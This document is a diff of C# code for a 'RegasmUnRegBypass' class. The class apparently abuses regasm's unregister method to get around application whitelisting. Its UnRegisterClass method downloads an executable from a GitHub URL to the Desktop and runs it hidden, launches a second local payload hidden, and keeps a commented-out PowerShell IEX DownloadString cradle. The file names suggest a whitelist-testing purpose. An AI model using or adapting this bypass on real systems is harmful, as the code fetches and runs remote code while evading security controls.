@@ -18,15 +18,15 @@ namespace RegasmUnRegBypass
         public static void UnRegisterClass(string key)
         {
             string remoteUri = "https://raw.githubusercontent.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/master/Payload/RegasmUnRegBypass/RegasmUnRegOnlinePayload.exe";
-            string fileName = "RegasmUnRegOnlinePayloadDownloaded.exe", myStringWebResource = null;
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            string fileName = "\\RegasmUnRegOnlinePayloadDownloaded.exe";
+            string downloadPath = path + fileName;
             // Create a new WebClient instance.
             WebClient myWebClient = new WebClient();
-            // Concatenate the domain with the Web resource filename.
-            myStringWebResource = remoteUri + fileName;
             try
             {
                 // Download the Web resource and save it into the current filesystem folder.
-                myWebClient.DownloadFile(myStringWebResource, fileName);
+                myWebClient.DownloadFile(remoteUri, downloadPath);
                 System.Diagnostics.Process process = new System.Diagnostics.Process();
             }
             catch
@@ -35,7 +35,7 @@ namespace RegasmUnRegBypass
             System.Diagnostics.Process processA = new System.Diagnostics.Process();
             System.Diagnostics.ProcessStartInfo startInfoA = new System.Diagnostics.ProcessStartInfo();
             startInfoA.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-            startInfoA.FileName = "RegasmUnRegOnlinePayloadDownloaded.exe";
+            startInfoA.FileName = downloadPath;
             processA.StartInfo = startInfoA;
             try
             {
@@ -44,11 +44,11 @@ namespace RegasmUnRegBypass
             catch
             {
             }
-
+            string localPath = path + "\\RegasmUnRegOfflinePayload.exe";
             System.Diagnostics.Process processB = new System.Diagnostics.Process();
             System.Diagnostics.ProcessStartInfo startInfoB = new System.Diagnostics.ProcessStartInfo();
             startInfoB.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-            startInfoB.FileName = "RegasmUnRegOfflinePayload.exe";
+            startInfoB.FileName = localPath;
             processB.StartInfo = startInfoB;
             try
             {
@@ -63,8 +63,7 @@ namespace RegasmUnRegBypass
             //ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/WhiteListTestScript.ps1')");
             //ps.Invoke();
 
-            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-            string filename = "/WLtester.txt";
+            string filename = "\\WLtester.txt";
             path += filename;
             using (FileStream file = File.Exists(path) ? File.Open(path, FileMode.Append) : File.Open(path, FileMode.CreateNew))
             {
